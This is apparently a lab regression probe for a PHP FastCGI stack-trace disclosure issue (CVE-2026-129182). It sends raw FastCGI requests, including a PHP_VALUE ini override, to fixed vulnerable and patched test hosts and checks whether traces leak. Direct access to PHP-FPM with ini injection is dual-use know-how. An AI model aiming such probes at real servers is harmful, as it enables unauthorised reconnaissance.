#!/usr/bin/env python3
"""Fixed-target FastCGI observation probe for CVE-2026-129182."""

import re
import socket
import struct
import sys

HOSTS = {
    "fatal-backtrace-vulnerable",
    "fatal-backtrace-patched",
}

SCENARIOS = {
    "memory": (
        "/var/www/html/memory/producer.php",
        "producer",
    ),
    "zlib": (
        "/var/www/html/zlib/producer.php",
        "",
    ),
}

def recv_exact(sock, size):
    data = bytearray()
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            raise RuntimeError("Unexpected FastCGI connection close")
        data.extend(chunk)
    return bytes(data)

def record(kind, content, request_id=1):
    padding = b"\x00" * ((-len(content)) % 8)
    header = struct.pack(
        "!BBHHBB", 1, kind, request_id, len(content), len(padding), 0
    )
    return header + content + padding

def encode_length(value):
    if value < 128:
        return bytes([value])
    return struct.pack("!I", value | 0x80000000)

def encode_params(params):
    result = bytearray()
    for name, value in params.items():
        key = name.encode()
        val = value.encode()
        result += encode_length(len(key))
        result += encode_length(len(val))
        result += key + val
    return bytes(result)

def request(host, script, query="", php_value=None):
    uri = script.replace("/var/www/html", "")
    params = {
        "GATEWAY_INTERFACE": "FastCGI/1.0",
        "REQUEST_METHOD": "GET",
        "SCRIPT_FILENAME": script,
        "SCRIPT_NAME": uri,
        "REQUEST_URI": uri + (("?" + query) if query else ""),
        "QUERY_STRING": query,
        "SERVER_PROTOCOL": "HTTP/1.1",
        "SERVER_NAME": "localhost",
        "SERVER_PORT": "80",
        "SERVER_ADDR": "127.0.0.1",
        "REMOTE_ADDR": "127.0.0.1",
        "REMOTE_PORT": "40000",
        "DOCUMENT_ROOT": "/var/www/html",
        "CONTENT_TYPE": "",
        "CONTENT_LENGTH": "0",
    }

    if php_value is not None:
        params["PHP_VALUE"] = php_value

    payload = (
        record(1, struct.pack("!HB5x", 1, 0))
        + record(4, encode_params(params))
        + record(4, b"")
        + record(5, b"")
        + record(5, b"")
    )

    stdout = bytearray()
    stderr = bytearray()

    with socket.create_connection((host, 9000), timeout=8) as sock:
        sock.settimeout(12)
        sock.sendall(payload)

        while True:
            header = recv_exact(sock, 8)
            version, kind, request_id, length, padding, _ = struct.unpack(
                "!BBHHBB", header
            )
            content = recv_exact(sock, length)
            if padding:
                recv_exact(sock, padding)

            if kind == 6:
                stdout.extend(content)
            elif kind == 7:
                stderr.extend(content)
            elif kind == 3:
                break

    raw = bytes(stdout)
    parts = re.split(rb"\r?\n\r?\n", raw, maxsplit=1)
    headers = parts[0] if len(parts) == 2 else b""
    body = parts[1] if len(parts) == 2 else raw
    match = re.search(rb"(?im)^Status:\s*(\d+)", headers)
    status = int(match.group(1)) if match else 200

    return status, body.decode("utf-8", "replace").strip(), \
        stderr.decode("utf-8", "replace").strip()

def main():
    if len(sys.argv) != 3:
        raise SystemExit(
            "Usage: probe.py fatal-backtrace-vulnerable|"
            "fatal-backtrace-patched memory|zlib"
        )

    host, scenario = sys.argv[1:]
    if host not in HOSTS or scenario not in SCENARIOS:
        raise SystemExit("Refusing unknown target or scenario")

    producer, query = SCENARIOS[scenario]
    baseline = "/var/www/html/baseline.php"

    steps = [
        ("baseline", baseline, "", None),
        ("producer", producer, query, None),
        ("early-diagnostic", baseline, "", "date.timezone=invalid"),
    ]

    pids = []
    observed = {}
    statuses = {}
    for label, script, request_query, php_value in steps:
        status, body, stderr = request(
            host, script, request_query, php_value
        )
        print(f"STEP={label}")
        print(f"HTTP_STATUS={status}")
        print(f"BODY={body!r}")
        print(f"FASTCGI_STDERR={stderr!r}")
        observed[label] = stderr
        statuses[label] = status

        lines = body.splitlines()
        if len(lines) >= 2 and lines[0].isdigit():
            pids.append(lines[0])

    same_worker = len(pids) == 3 and len(set(pids)) == 1
    producer_trace = "Stack trace:" in observed.get("producer", "")
    early_trace = "Stack trace:" in observed.get("early-diagnostic", "")
    early_warning = "Invalid date.timezone value 'invalid'" in observed.get("early-diagnostic", "")

    expected_trigger = (
        "Failed to set memory limit to 8388608 bytes"
        if scenario == "memory"
        else "Cannot use both zlib.output_compression and output_handler together!!"
    )
    trigger_seen = expected_trigger in observed.get("producer", "")
    expected_trace = host == "fatal-backtrace-vulnerable"
    trace_policy_ok = producer_trace == expected_trace

    print(f"WORKER_PIDS={pids}")
    print(f"SAME_WORKER={same_worker}")
    print(f"EXPECTED_SHUTDOWN_FATAL={trigger_seen}")
    print(f"PRODUCER_STACK_TRACE={producer_trace}")
    print(f"EXPECTED_PRODUCER_STACK_TRACE={expected_trace}")
    print(f"EARLY_WARNING_CONFIRMED={early_warning}")
    print(f"EARLY_DIAGNOSTIC_STACK_TRACE={early_trace}")

    if not all(status == 200 for status in statuses.values()):
        print("REGRESSION_OBSERVATION=INCOMPLETE_HTTP_STATUS")
        return 2

    if not same_worker or not trigger_seen or not early_warning or early_trace or not trace_policy_ok:
        print("REGRESSION_OBSERVATION=INCONCLUSIVE")
        return 3

    print("REGRESSION_OBSERVATION=PASS")
    return 0

if __name__ == "__main__":
    sys.exit(main())
